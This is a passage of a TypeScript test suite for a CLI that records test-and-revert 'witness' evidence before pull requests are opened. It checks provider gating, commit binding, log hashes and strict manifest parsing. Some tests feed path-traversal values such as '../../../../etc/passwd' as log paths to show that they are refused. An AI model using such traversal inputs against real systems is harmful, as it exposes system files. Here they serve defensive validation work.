test("the halt command, typed in GitHub's casing, actually halts", () => {
  const seed = seedState();
  const dir = tmp("foundry-cli-halt-");
  const statePath = join(dir, ".foundry-state.json");
  writeFileSync(statePath, JSON.stringify(seed));
  const cli = join(import.meta.dirname, "cli.ts");
  // The ledger is repo-anchored, so a spawned CLI must be pointed at the temp copy explicitly or it
  // would read — and mutate — the real repo-root state file.
  const at = (args: string[]) =>
    spawnSync(process.execPath, ["--experimental-strip-types", cli, ...args, "--state", statePath], {
      cwd: dir,
      encoding: "utf8",
    });

  const halt = at(["halt", "colemurray/background-agents", "--reason", "maintainer asked us to stop"]);
  assert.equal(halt.status, 0, `${halt.stdout}${halt.stderr}`);
  // It reports the roster's spelling — the row it moved, not the argument it was given.
  assert.match(halt.stdout, /halted ColeMurray\/background-agents \(scorecard banned\)/);

  const after = at(["status"]);
  assert.equal(after.status, 0, `${after.stdout}${after.stderr}`);
  const row = after.stdout.split("\n").find((l) => l.includes("ColeMurray/background-agents  opened="))!;
  assert.ok(row, after.stdout);
  assert.match(row, /tone=banned/);
  assert.match(row, /health=stop/);
  assert.match(after.stdout, /bans=1/);
  assert.match(after.stdout, /in flight: none/);

  // And the fail-closed half survives: a repo the roster does not know is still refused, loudly.
  const stranger = at(["halt", "attacker/background-agents", "--reason", "x"]);
  assert.equal(stranger.status, 1, `${stranger.stdout}${stranger.stderr}`);
  assert.match(stranger.stderr, /attacker\/background-agents is not on the allowlist/);
});

test("test-path classifier knows suffix conventions and setup runs before tests", async () => {
  assert.equal(isTestPath("handler_test.go"), true);
  assert.equal(isTestPath("pkg/server/server_test.go"), true);
  assert.equal(isTestPath("foo_test.py"), true);
  assert.equal(isTestPath("foo_spec.rb"), true);
  assert.equal(isTestPath("src/contest.ts"), false);
  assert.equal(isTestPath("src/protest/handler.ts"), false);
  assert.equal(isTestPath("attestation.ts"), false);

  const calls: string[] = [];
  const runner = async (step: string, args: string[]) => {
    calls.push([step, ...args].join(" "));
    if (step === "mkdtemp") return { exit: 0, output: FAKE_SCRATCH };
    if (step === "run-tests@head") return { exit: 0, output: "ok" };
    if (step === "run-tests@revert") return { exit: 1, output: "red" };
    return { exit: 0, output: "" };
  };
  const outcome = await witnessEvidence(
    {
      packetId: "pkt_ravidsrk_frontguard_195",
      repoId: "ravidsrk/frontguard",
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "npm test",
      setupCommand: "npm ci",
      sandbox: "host",
      wave: 0,
    },
    runner as never,
    {},
  );
  assert.equal(outcome.ok, true);
  const setupIdxs = calls.flatMap((c, i) => (c.startsWith("run-setup npm ci") ? [i] : []));
  const headIdx = calls.findIndex((c) => c.startsWith("run-tests@head"));
  const cleanIdx = calls.findIndex((c) => c.includes("clean -fdx"));
  const revertIdx = calls.findIndex((c) => c.startsWith("run-tests@revert"));
  assert.equal(setupIdxs.length, 2);
  assert.ok(headIdx !== -1 && cleanIdx !== -1 && revertIdx !== -1);
  assert.ok(setupIdxs[0] < headIdx && headIdx < cleanIdx && cleanIdx < setupIdxs[1] && setupIdxs[1] < revertIdx);

  const noSetup = await witnessEvidence(
    { packetId: "pkt_ravidsrk_orca-fleet_71", repoId: "ravidsrk/orca-fleet", baseSha: BASE, headSha: HEAD, testCommand: "true", sandbox: "host", wave: 0 },
    runner as never,
    {},
  );
  assert.equal(noSetup.ok, true);
});

test("a shape-valid witness with a green revert cannot pass the engine gate", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  const packet = state.packets[0];
  state = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
    witness: {
      provider: "host",
      testExit: 0,
      revertExit: 0,
      testLogSha: "e".repeat(64),
      revertLogSha: "f".repeat(64),
      ranAt: "2026-08-28T18:00:00.000Z",
      repoId: packet.repoId,
      baseSha: BASE,
      headSha: HEAD,
      testLogPath: `docs/evidence/logs/${id}/test.log`,
      revertLogPath: `docs/evidence/logs/${id}/revert.log`,
    },
  }, bindingFor(packet)).state;
  const blocked = applyAdvance(state, id);
  assert.match(blocked.error ?? "", /witnessed/);
});

test("a daytona witness loads, is refused at the gate on today's allowlist, and the executor names the right provider", async () => {
  const seed = seedState();
  const packet = { ...seed.packets[0] };
  packet.evidence = {
    ...packet.evidence!,
    witness: {
      provider: "daytona",
      testExit: 0,
      revertExit: 1,
      testLogSha: "a".repeat(64),
      revertLogSha: "b".repeat(64),
      ranAt: "2026-08-28T18:00:00.000Z",
      repoId: packet.repoId,
      baseSha: packet.evidence!.baseSha,
      headSha: packet.evidence!.headSha,
      testLogPath: `docs/evidence/logs/${packet.id}/test.log`,
      revertLogPath: `docs/evidence/logs/${packet.id}/revert.log`,
    },
  };
  const path = join(tmp("foundry-"), "daytona.json");
  writeFileSync(path, JSON.stringify({ ...seed, packets: [packet, ...seed.packets.slice(1)] }));
  const loaded = loadFactoryState(path);
  assert.equal(loaded.ok, true);

  const noKey = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "daytona", wave: 1 },
    (async () => ({ exit: 0, output: "" })) as never,
    {},
  );
  assert.equal(noKey.ok, false);
  if (!noKey.ok) assert.match(noKey.error, /dry-run/i);

  const daytonaNamed = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "daytona", wave: 1 },
    (async () => ({ exit: 0, output: "" })) as never,
    { E2B_API_KEY: "present" },
  );
  assert.equal(daytonaNamed.ok, false);
  if (!daytonaNamed.ok) assert.match(daytonaNamed.error, /Daytona execution/);

  const e2bNamed = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "e2b", wave: 1 },
    (async () => ({ exit: 0, output: "" })) as never,
    { E2B_API_KEY: "present" },
  );
  assert.equal(e2bNamed.ok, false);
  if (!e2bNamed.ok) assert.match(e2bNamed.error, /E2B execution/);

  // The half the old version of this test never touched: it asserted a daytona witness *loads*,
  // which says nothing, because loading is shape validation. ADR 0003 permits Daytona at Wave 1+,
  // but the per-repo choice belongs to `allowlist.yaml`, and every Wave 1–2 entry there reads
  // `sandbox: e2b` — so on today's allowlist a daytona witness is refused everywhere, and the
  // refusal must say so without blaming the ADR that permits the provider.
  const { state: wave1, id } = reviewingWave1();
  const target = wave1.packets[0];
  assert.equal(repoById(target.repoId)?.sandbox, "e2b");
  const refusedAtGate = applyAttachEvidence(
    wave1,
    id,
    manifestWith(boundWitness("daytona", target.repoId, id)),
    bindingFor(target),
  );
  assert.ok(refusedAtGate.error, "a daytona witness must not attach to an e2b-gated repo");
  assert.match(refusedAtGate.error!, /daytona.*does not match.*sandbox e2b/i);
  assert.match(refusedAtGate.error!, /allowlist\.yaml/);
  assert.doesNotMatch(
    refusedAtGate.error!,
    /does not match [^—]*\(ADR 0003\)/,
    "ADR 0003 states no per-repo equality rule — the refusal must not cite it as the source",
  );
  assert.equal(refusedAtGate.state.packets[0].evidence, undefined);
  assert.ok(
    ALLOWLIST.filter((r) => r.wave >= 1).every((r) => r.sandbox === "e2b"),
    "docs/06-v2.md says every Wave 1–2 entry reads `sandbox: e2b`; if that changes, so must the doc",
  );
});

// --- Witness provenance at the gate, subject binding, and persisted logs (issues #35, #36) ---

/**
 * Wave 1 + `sandbox: e2b`. Tick cannot pick a Wave 1 row anymore: awesome-copilot and
 * e2b-cookbook are `no-suite` with empty `firstIssues` (issue #112), and the seed already
 * occupies ColeMurray#1476. Queue a suite-bearing Wave 1 repo on the seed so the two
 * attested Wave 0 merges still satisfy the promotion gate.
 */
function reviewingWave1(): { state: FactoryState; id: string } {
  const queued = applyQueueLive(
    seedState(),
    live("mcp-use/mcp-use", 991, "docs typo"),
    {
      contributing:
        "Thanks for contributing! Run `pnpm test` before opening a pull request and open an issue first for anything large.",
    },
  );
  if (!queued.packet || queued.reason !== "gated") {
    throw new Error(`reviewingWave1: expected a gated mcp-use packet, got ${queued.reason}`);
  }
  const id = queued.packet.id;
  let state = queued.state;
  const approved = applyApprove(state, id, "Wave 1 freeze");
  if (approved.error) throw new Error(`reviewingWave1 approve: ${approved.error}`);
  state = approved.state;
  const implementing = applyAdvance(state, id);
  if (implementing.error) throw new Error(`reviewingWave1 implement: ${implementing.error}`);
  state = implementing.state;
  const reviewing = applyAdvance(state, id);
  if (reviewing.error) throw new Error(`reviewingWave1 review: ${reviewing.error}`);
  return { state: reviewing.state, id };
}

function boundWitness(
  provider: "host" | "e2b" | "daytona",
  repoId: string,
  packetId: string,
  extra: Record<string, unknown> = {},
) {
  return {
    provider,
    testExit: 0,
    revertExit: 1,
    testLogSha: "c".repeat(64),
    revertLogSha: "d".repeat(64),
    ranAt: "2026-08-29T09:00:00.000Z",
    repoId,
    baseSha: BASE,
    headSha: HEAD,
    testLogPath: `docs/evidence/logs/${packetId}/test.log`,
    revertLogPath: `docs/evidence/logs/${packetId}/revert.log`,
    ...extra,
  };
}

/**
 * A manifest carrying an arbitrary `witness`, INCLUDING a malformed one. The parameter is `unknown`
 * on purpose: most callers here hand it something the validator must reject — wrong provider, wrong
 * subject, identical log hashes, a missing field — and a fixture that could only build valid
 * witnesses could not test a single refusal. The cast on the return is the boundary where that
 * intent meets the typed API, and it is safe precisely because `applyAttachEvidence` re-validates
 * shape at runtime; that re-validation is what these tests are checking.
 */
function manifestWith(witness: unknown, extra: Record<string, unknown> = {}): EvidenceManifest {
  return {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert" as const,
    filesChanged: 1,
    diffLines: 1,
    notes: [],
    // Cast here, not at the call sites: see this function's docblock. Callers pass junk on purpose.
    witness: witness as EvidenceManifest["witness"],
    ...extra,
  };
}

test("a host witness on an e2b repo is refused at the gate", () => {
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  assert.equal(packet.repoId, "mcp-use/mcp-use");
  const forged = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.ok(forged.error, "a host witness must not attach to an e2b repo");
  assert.match(forged.error!, /host witnessing is Wave 0 only \(ADR 0003\)/);
  assert.equal(forged.state.packets[0].evidence, undefined);
  const advanced = applyAdvance(forged.state, id);
  assert.ok(advanced.error);
  assert.equal(advanced.state.packets[0].status, "reviewing");
});

test("an e2b witness on a Wave-0 host repo is refused at the gate", () => {
  const { state, id } = reviewing();
  const packet = state.packets[0];
  assert.equal(packet.repoId, "ravidsrk/orca-fleet");
  const mismatched = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.ok(mismatched.error, "an e2b witness must not attach to a host repo");
  assert.match(mismatched.error!, /e2b.*does not match.*sandbox host|sandbox host.*e2b/i);
  assert.equal(mismatched.state.packets[0].evidence, undefined);
});

test("a witness bound to another repo or another range is refused", () => {
  const { state, id } = reviewing();
  const packet = state.packets[0];

  const foreign = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", "ravidsrk/frontguard", id)),
    bindingFor(packet),
  );
  assert.ok(foreign.error, "a witness produced for another repo must not attach");
  assert.match(foreign.error!, /witness was produced for ravidsrk\/frontguard/);

  const otherHead = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id, { headSha: OTHER })),
    bindingFor(packet),
  );
  assert.ok(otherHead.error, "a witness produced for another head must not attach");
  assert.match(otherHead.error!, /commit range/i);
  assert.match(otherHead.error!, new RegExp(OTHER.slice(0, 7)));

  // #36 says "SHAs", plural, and only the head half of that comparison was exercised: neutering
  // the baseSha half left the suite green. A witness produced for A..HEAD, re-pointed at a
  // manifest claiming B..HEAD, is the same forgery with the other end moved.
  const otherBase = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id, { baseSha: OTHER })),
    bindingFor(packet),
  );
  assert.ok(otherBase.error, "a witness produced for another base must not attach");
  assert.match(otherBase.error!, /commit range/i);
  assert.match(otherBase.error!, new RegExp(`${OTHER.slice(0, 7)}\\.\\.${HEAD.slice(0, 7)}`));
  assert.equal(otherBase.state.packets[0].evidence, undefined);

  const unbound = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id, { repoId: undefined })),
    bindingFor(packet),
  );
  assert.ok(unbound.error, "a witness that names no subject must not attach");
  // ...and it is the subject guard that refused it, not an incidental throw on the way there.
  assert.match(unbound.error!, /names no subject/i);
  assert.match(unbound.error!, /repoId, baseSha and headSha/);

  const noLogs = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("host", packet.repoId, id, { testLogPath: undefined })),
    bindingFor(packet),
  );
  assert.ok(noLogs.error, "a witness whose logs were never persisted must not attach");
  assert.match(noLogs.error!, /log/i);
});

test("the gate refuses a witness that points at logs outside its own packet", () => {
  // Provenance and the SHAs can all bind while the log paths point somewhere else entirely —
  // and the direct-state-write path of #36 never passes through the parser, so the gate has to
  // repeat the rule. Before this, `witnessProvenanceViolation` returned nothing for any of these.
  const { state, id } = reviewing();
  const packet = state.packets[0];
  const strays: [string, Record<string, unknown>][] = [
    ["an absolute path", { testLogPath: "/etc/passwd" }],
    ["traversal out of the tree", { revertLogPath: "../../../../outside.log" }],
    ["another packet's log directory", {
      testLogPath: "docs/evidence/logs/pkt_someone_else_1/test.log",
      revertLogPath: "docs/evidence/logs/pkt_someone_else_1/revert.log",
    }],
  ];
  for (const [label, paths] of strays) {
    const stray = applyAttachEvidence(
      state,
      id,
      manifestWith(boundWitness("host", packet.repoId, id, paths)),
      bindingFor(packet),
    );
    assert.ok(stray.error, `${label} must not attach`);
    assert.match(stray.error!, /log path/i, label);
    assert.equal(stray.state.packets[0].evidence, undefined, label);
    // ...and it cannot be promoted around the attach path either.
    const forged: FactoryState = {
      ...state,
      packets: state.packets.map((pk) =>
        pk.id === id
          ? {
              ...pk,
              evidence: {
                ...manifestWith(boundWitness("host", packet.repoId, id, paths)),
                shaVerified: true,
              },
            }
          : pk,
      ),
    };
    assert.equal(evidenceIsReady(forged.packets[0]), false, label);
  }
});

test("a provenanced e2b witness carries a Wave-1 packet to draft-ready", () => {
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const attached = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.equal(attached.error, undefined);
  assert.equal(evidenceIsReady(attached.state.packets[0]), true);
  const advanced = applyAdvance(attached.state, id);
  assert.equal(advanced.error, undefined);
  assert.equal(advanced.state.packets[0].status, "draft-ready");
  assert.equal(advanced.state.packets[0].evidence?.witness?.provider, "e2b");
  assert.ok(advanced.state.packets[0].prBody?.includes(DISCLOSURE));
});

test("witness log hashes are recomputable from disk", async () => {
  const witnessModule = await import("./witness.ts");
  const dir = tmp("foundry-logs-");
  const testLog = "42 passing\n";
  const revertLog = "3 failing\n";
  writeFileSync(join(dir, "test.log"), testLog);
  writeFileSync(join(dir, "revert.log"), revertLog);
  const sha = (text: string) => createHash("sha256").update(text).digest("hex");
  const witness = {
    provider: "e2b" as const,
    testExit: 0,
    revertExit: 1,
    testLogSha: sha(testLog),
    revertLogSha: sha(revertLog),
    ranAt: "2026-08-29T09:00:00.000Z",
    repoId: "github/awesome-copilot",
    baseSha: BASE,
    headSha: HEAD,
    testLogPath: join(dir, "test.log"),
    revertLogPath: join(dir, "revert.log"),
  };
  const read = (p: string) => {
    try {
      return readFileSync(p, "utf8");
    } catch {
      return undefined;
    }
  };
  const good = witnessModule.verifyWitnessLogs(witness, read);
  assert.equal(good.ok, true);

  const lying = witnessModule.verifyWitnessLogs({ ...witness, testLogSha: "0".repeat(64) }, read);
  assert.equal(lying.ok, false);
  if (!lying.ok) assert.match(lying.error, /does not match/i);

  const missing = witnessModule.verifyWitnessLogs(
    { ...witness, revertLogPath: join(dir, "nope.log") },
    read,
  );
  assert.equal(missing.ok, false);
  if (!missing.ok) assert.match(missing.error, /unreadable|not found|missing/i);
});

test("the host witness persists both logs and binds them to its subject", async () => {
  const { runner } = fakeRunner({
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence(
    {
      packetId: "pkt_ravidsrk_orca-fleet_71",
      repoId: "ravidsrk/orca-fleet",
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "python3 scripts/validate.py",
      sandbox: "host",
      wave: 0,
    },
    runner,
    {},
  );
  assert.equal(outcome.ok, true);
  if (!outcome.ok) return;
  assert.equal(outcome.witness.repoId, "ravidsrk/orca-fleet");
  assert.equal(outcome.witness.baseSha, BASE);
  assert.equal(outcome.witness.headSha, HEAD);
  assert.equal(outcome.logs.test, "42 passing");
  assert.equal(outcome.logs.revert, "3 failing");
  assert.equal(
    outcome.witness.testLogSha,
    createHash("sha256").update(outcome.logs.test).digest("hex"),
  );
  const read = (p: string) =>
    p === outcome.witness.testLogPath
      ? outcome.logs.test
      : p === outcome.witness.revertLogPath
        ? outcome.logs.revert
        : undefined;
  assert.equal(verifyWitnessLogs(outcome.witness, read).ok, true);
});

test("both worker-host refusals name the ingest verb, in a form the operator can actually type", async () => {
  // #35 is the defect class "a refusal points at a path the operator cannot take". `foundry` is an
  // npm script name in a `private: true` package with no `bin`, so a refusal spelling
  // `foundry attach-witness ...` reintroduces the defect one layer down. Assert the real form.
  const subject = {
    packetId: "pkt_github_awesome-copilot_2684",
    repoId: "github/awesome-copilot",
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    sandbox: "e2b" as const,
    wave: 1 as const,
  };
  const noop = (async () => ({ exit: 0, output: "" })) as never;
  const withKey = await witnessEvidence(subject, noop, { E2B_API_KEY: "present" });
  // The operator *without* a key hits this one first, and the way forward is the same verb.
  const withoutKey = await witnessEvidence(subject, noop, {});

  for (const [label, refused] of [["key present", withKey], ["no key", withoutKey]] as const) {
    assert.equal(refused.ok, false, label);
    if (refused.ok) continue;
    assert.match(refused.error, /attach-witness/, label);
    assert.ok(
      refused.error.includes(`node --experimental-strip-types factory/cli.ts attach-witness ${subject.packetId} --manifest <path>`),
      `${label}: ${refused.error}`,
    );
    assert.doesNotMatch(refused.error, /`foundry attach-witness/, label);
  }

  // ...and the invocation the refusals print is one the binary actually answers to.
  const help = spawnSync(
    process.execPath,
    ["--experimental-strip-types", join(import.meta.dirname, "cli.ts"), "--help"],
    { encoding: "utf8" },
  );
  assert.equal(help.status, 0, `${help.stdout}${help.stderr}`);
  assert.match(help.stdout, /attach-witness <packetId> --manifest <path>/);

  // The reason `foundry` is not one: nothing in this package puts it on a PATH. Asserted against
  // the manifest rather than the machine, so it holds wherever the suite runs.
  const pkg = JSON.parse(readFileSync(join(import.meta.dirname, "..", "package.json"), "utf8"));
  assert.equal(pkg.private, true);
  assert.equal(pkg.bin, undefined, "a `bin` would make `foundry ...` real — then the pointers may use it");
});

test("an ingested witness manifest is parsed strictly, never trusted by shape alone", async () => {
  const { parseWitnessManifest } = await import("./witness.ts");
  const PKT = "pkt_github_awesome-copilot_2684";
  const good = JSON.stringify({
    ...boundWitness("e2b", "github/awesome-copilot", PKT),
    testCommand: "true",
    notes: ["produced on the worker host"],
  });
  const parsed = parseWitnessManifest(good, PKT);
  assert.equal(parsed.ok, true);
  if (parsed.ok) {
    assert.equal(parsed.manifest.witness.provider, "e2b");
    assert.equal(parsed.manifest.testCommand, "true");
    assert.deepEqual(parsed.manifest.notes, ["produced on the worker host"]);
    assert.equal(parsed.manifest.witness.testLogPath, `docs/evidence/logs/${PKT}/test.log`);
  }

  // Every guard the parser states, not a sample of them: the test's name claims strictness, so
  // each rule gets a case that dies if the rule is deleted.
  const mutate = (change: (o: Record<string, unknown>) => void): string => {
    const o = JSON.parse(good);
    change(o);
    return JSON.stringify(o);
  };
  const refusals: [string, string, RegExp][] = [
    ["not JSON at all", "{", /not JSON/i],
    ["a JSON array", "[]", /must be a JSON object/i],
    ["a JSON scalar", '"witnessed, honest"', /must be a JSON object/i],
    ["an unknown provider", mutate((o) => { o.provider = "laptop"; }), /provider must be one of/i],
    ["a non-numeric testExit", mutate((o) => { o.testExit = "0"; }), /exit codes as numbers/i],
    ["a missing revertExit", mutate((o) => { delete o.revertExit; }), /exit codes as numbers/i],
    ["a malformed testLogSha", mutate((o) => { o.testLogSha = "nope"; }), /testLogSha must be a sha256/i],
    ["a truncated revertLogSha", mutate((o) => { o.revertLogSha = "ab"; }), /revertLogSha must be a sha256/i],
    ["no ranAt", mutate((o) => { delete o.ranAt; }), /must record ranAt/i],
    ["a blank repoId", mutate((o) => { o.repoId = "   "; }), /must name the repoId/i],
    ["a short baseSha", mutate((o) => { o.baseSha = "abc123"; }), /baseSha must be a full 40-hex/i],
    ["a ref instead of a headSha", mutate((o) => { o.headSha = "HEAD"; }), /headSha must be a full 40-hex/i],
    ["no revertLogPath", mutate((o) => { delete o.revertLogPath; }), /must reference the persisted run logs/i],
    ["no testCommand", mutate((o) => { delete o.testCommand; }), /must record the testCommand/i],
  ];
  for (const [label, raw, message] of refusals) {
    const result = parseWitnessManifest(raw, PKT);
    assert.equal(result.ok, false, `a manifest with ${label} must be refused`);
    if (!result.ok) assert.match(result.error, message, label);
  }

  // `notes` is the one tolerant field by design — a non-array, or an array of non-strings, is
  // dropped rather than refused, and the manifest still parses.
  for (const junk of [{ notes: "a string" }, { notes: [1, 2] }, { notes: undefined }]) {
    const loose = parseWitnessManifest(mutate((o) => Object.assign(o, junk)), PKT);
    assert.equal(loose.ok, true, `notes=${JSON.stringify(junk.notes)} must not refuse the manifest`);
    if (loose.ok) assert.deepEqual(loose.manifest.notes, []);
  }
});

test("a manifest may name only this packet's own log paths, and the parser settles that before the read", async () => {
  // The manifest is operator-supplied file content, and `attach-witness` reads whatever these
  // paths name straight off disk. Before this, `parseWitnessManifest` accepted
  // `../../../../etc/passwd` — the rule docs/10-schemas.md already stated was never enforced.
  const { parseWitnessManifest, witnessLogPathViolation } = await import("./witness.ts");
  const PKT = "pkt_github_awesome-copilot_2684";
  const raw = (paths: Record<string, unknown>) =>
    JSON.stringify({
      ...boundWitness("e2b", "github/awesome-copilot", PKT),
      testCommand: "true",
      ...paths,
    });

  const strays: [string, Record<string, unknown>][] = [
    ["traversal out of the tree", { testLogPath: "../../../../etc/passwd" }],
    ["an absolute path", { testLogPath: "/etc/passwd" }],
    ["a revert log outside the tree", { revertLogPath: "../../../../outside.log" }],
    ["another packet's directory", {
      testLogPath: "docs/evidence/logs/pkt_someone_else_1/test.log",
      revertLogPath: "docs/evidence/logs/pkt_someone_else_1/revert.log",
    }],
    ["the right directory, the wrong filename", { testLogPath: `docs/evidence/logs/${PKT}/passwd` }],
  ];
  for (const [label, paths] of strays) {
    const result = parseWitnessManifest(raw(paths), PKT);
    assert.equal(result.ok, false, `${label} must be refused before anything is read`);
    if (!result.ok) assert.match(result.error, /log path/i, label);
  }

  assert.equal(parseWitnessManifest(raw({}), PKT).ok, true, "the canonical paths must still parse");
  // And a real run always satisfies the rule, so the check costs the honest path nothing.
  const { witnessLogPaths } = await import("./witness.ts");
  assert.equal(witnessLogPathViolation(PKT, witnessLogPaths(PKT)), undefined);
});

test("an ingested manifest may carry a toolchain, and may not carry a junk one", async () => {
  // Optional in both directions on purpose. Every witness produced before #41 has no `toolchain`
  // and must still ingest; a witness that has one must not be able to smuggle a non-string into
  // the ledger, where `renderEvidencePage` interpolates it into the maintainer's page.
  const { parseWitnessManifest } = await import("./witness.ts");
  const PKT = "pkt_github_awesome-copilot_2684";
  const raw = (extra: Record<string, unknown>) =>
    JSON.stringify({
      ...boundWitness("e2b", "github/awesome-copilot", PKT, extra),
      testCommand: "true",
    });

  const carried = parseWitnessManifest(raw({ toolchain: "python3 3.14.7" }), PKT);
  assert.equal(carried.ok, true);
  if (carried.ok) assert.equal(carried.manifest.witness.toolchain, "python3 3.14.7");

  const absent = parseWitnessManifest(raw({}), PKT);
  assert.equal(absent.ok, true);
  if (absent.ok) assert.equal(absent.manifest.witness.toolchain, undefined);

  for (const junk of [{ toolchain: 12 }, { toolchain: { node: "24" } }, { toolchain: "   " }]) {
    const result = parseWitnessManifest(raw(junk), PKT);
    assert.equal(result.ok, false, `${JSON.stringify(junk)} must be refused`);
    if (!result.ok) assert.match(result.error, /toolchain/i);
  }
});

test("the evidence page tells the maintainer where the hashed logs are", () => {
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const attached = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.equal(attached.error, undefined);
  const page = renderEvidencePage(attached.state.packets[0]);
  assert.match(page, new RegExp(`docs/evidence/logs/${id}/test\\.log`));
  assert.match(page, new RegExp(`docs/evidence/logs/${id}/revert\\.log`));
  // A bare relative path resolves to nothing in an upstream maintainer's own tree, and the page is
  // written for them (ADR 0005). The recompute offer has to name the repo the logs are committed in.
  assert.match(page, /Recompute it yourself/);
  // Pinned verbatim, not against itself: `page.includes(FOUNDRY_REPO_URL)` held for any value the
  // constant could take, so repointing it at `https://example.invalid/` stayed green. A URL the
  // reader cannot follow is #35's defect class, which is why INGEST_INVOCATION is pinned the same
  // way — the assertion has to know what the right answer is.
  assert.equal(FOUNDRY_REPO_URL, "https://github.com/ravidsrk/oss-foundry");
  assert.ok(page.includes("https://github.com/ravidsrk/oss-foundry"), page);
  assert.match(page, /not yours/);
  assert.match(page, new RegExp(`shasum -a 256 docs/evidence/logs/${id}/test\\.log`));
});

test("the evidence page names the toolchain the green was produced by, when the witness knows it", () => {
  // The fact issue #41 cost an operator three hours to establish by hand: *which* interpreter
  // produced this exit 0. A maintainer reading the page has the same question and no shell on our
  // machine, so a witness that resolved it prints it; one that did not says nothing rather than
  // implying the question was asked.
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const withTool = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id, { toolchain: "python3 3.14.7" })),
    bindingFor(packet),
  );
  assert.equal(withTool.error, undefined);
  assert.match(renderEvidencePage(withTool.state.packets[0]), /python3 3\.14\.7/);

  const without = applyAttachEvidence(
    state,
    id,
    manifestWith(boundWitness("e2b", packet.repoId, id)),
    bindingFor(packet),
  );
  assert.equal(without.error, undefined);
  assert.doesNotMatch(renderEvidencePage(without.state.packets[0]), /toolchain/i);
});

test("a witness forged straight into the ledger is refused at the promotion gate", () => {
  // The attack in #36: a hand-written witness that never passed through applyAttachEvidence,
  // exactly as a state file edited outside the CLI would present it.
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  const forgedLedger: FactoryState = {
    ...state,
    packets: state.packets.map((p) =>
      p.id === id
        ? {
            ...p,
            evidence: {
              ...manifestWith(boundWitness("host", packet.repoId, id)),
              shaVerified: true,
            },
          }
        : p,
    ),
  };
  assert.equal(evidenceIsReady(forgedLedger.packets[0]), false);
  const advanced = applyAdvance(forgedLedger, id);
  assert.ok(advanced.error, "a forged host witness must not promote a Wave-1 packet");
  assert.match(advanced.error!, /host witnessing is Wave 0 only \(ADR 0003\)/);
  assert.equal(advanced.state.packets[0].status, "reviewing");
});

// --- The ingest verb, driven as the real binary (issues #35, #36) ---
//
// Every assertion above this line is at the reducer/parser level, and the whole `attach-witness`
// handler could be deleted from cli.ts with the suite staying green — including the test that
// asserts the refusal *names* the verb, which passed against a verb that need not exist. That is
// #35's own defect blessed by a green test. These drive `node cli.ts attach-witness` for real.

/** The one network call on the ingest path, stubbed in the child so the test needs no GitHub. */
function writeCompareStub(dir: string, issueNumber: number, filesChanged = 1): string {
  const stub = join(dir, "stub-github.mjs");
  const canned = {
    status: "ahead",
    ahead_by: 1,
    behind_by: 0,
    files: Array.from({ length: filesChanged }, () => ({ additions: 1, deletions: 0 })),
    commits: [{ commit: { message: `docs: close the reference gaps\n\nFixes #${issueNumber}` } }],
  };
  writeFileSync(
    stub,
    `const canned = ${JSON.stringify(canned)};\n` +
      `globalThis.fetch = async (url) => {\n` +
      `  const u = String(url);\n` +
      `  if (u.includes("/compare/")) {\n` +
      `    return new Response(JSON.stringify(canned), { status: 200, headers: { "content-type": "application/json" } });\n` +
      `  }\n` +
      `  throw new Error("unstubbed fetch: " + u);\n` +
      `};\n`,
  );
  return stub;
}

function runCli(
  dir: string,
  args: string[],
  stub?: string,
  env: Record<string, string> = {},
  // Where the fixture's ledger lives, when that is deliberately NOT the cwd the child is started
  // in. Issue #80: witness log paths used to be found only because `cwd` happened to be the
  // fixture, so a test that proves the anchor has to be able to separate the two.
  stateDir: string = dir,
  // Only the guard test sets this: it needs a spawned CLI that FORGOT `--logs-root`, which is the
  // one thing every other caller here is careful never to be.
  omitLogsRoot = false,
) {
  const nodeArgs = ["--experimental-strip-types"];
  if (stub) nodeArgs.push("--import", pathToFileURL(stub).href);
  // `--state` is what isolates this, not `cwd`: the ledger path is anchored to the repo root, so a
  // spawned CLI left to its default would read and write the developer's real state file no matter
  // which temp directory it was started in. Every fixture here writes its ledger to
  // `<dir>/.foundry-state.json`, so point the child at that one unless a caller is deliberately
  // exercising some other path. `cwd` still matters — the witness log paths are relative to it.
  const stateArgs = args.includes("--state") ? [] : ["--state", join(stateDir, ".foundry-state.json")];
  // …and the same for the witness log root (issue #80). These fixtures used to find their logs
